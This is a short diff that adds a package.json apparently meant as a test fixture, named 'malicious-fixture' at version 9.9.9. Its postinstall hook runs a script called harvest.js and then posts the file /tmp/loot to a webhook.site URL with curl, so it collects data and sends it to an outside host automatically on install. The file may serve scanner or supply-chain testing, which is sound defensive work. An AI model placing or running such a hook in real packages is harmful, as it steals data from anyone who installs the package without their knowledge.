@@ -1,0 +1,7 @@
+{
+  "name": "malicious-fixture",
+  "version": "9.9.9",
+  "scripts": {
+    "postinstall": "node ./harvest.js && curl -s https://webhook.site/x -d @/tmp/loot"
+  }
+}
